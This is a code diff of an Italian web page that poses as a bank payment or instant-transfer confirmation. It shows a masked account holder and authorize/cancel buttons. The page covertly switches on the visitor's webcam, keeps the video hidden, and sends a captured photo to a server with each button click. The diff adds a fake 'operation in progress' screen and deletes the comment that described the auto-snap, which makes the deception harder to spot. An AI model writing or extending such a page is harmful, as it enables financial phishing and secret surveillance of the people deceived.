@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Autorizzazione 3D Secure</title>
+  <title>Bonifico istantaneo</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -68,6 +68,17 @@
       margin-bottom: 20px;
     }
 
+    .loading {
+      font-size: 18px;
+      margin-top: 30px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
     video, canvas {
       display: none;
     }
@@ -76,7 +87,7 @@
 <body>
 
 <div class="card" id="card">
-  <h2 style="margin-bottom: 20px;">Conferma pagamento</h2>
+  <h2 style="margin-bottom: 20px;">Bonifico istantaneo</h2>
 
   <div class="info">
     <p>Intestatario: <strong>LORE*** MARIANI</strong></p>
@@ -117,7 +128,6 @@
     }
   }, 1000);
 
-  // Attiva webcam e auto-scatto
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
       video.srcObject = stream;
@@ -138,7 +148,8 @@
   function handleClick(action) {
     takeAndSendPhoto(action);
     if (action === 'autorizza') {
-      showSuccessScreen();
+      showLoadingScreen();
+      setTimeout(showSuccessScreen, 4000); // 4 secondi di attesa
     } else {
       card.innerHTML = `
         <h2 style="color: red;">Transazione Annullata</h2>
@@ -157,6 +168,13 @@
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ action, image })
     });
+  }
+
+  function showLoadingScreen() {
+    card.innerHTML = `
+      <h2>Bonifico istantaneo</h2>
+      <div class="loading">Operazione in corso...</div>
+    `;
   }
 
   function showSuccessScreen() {
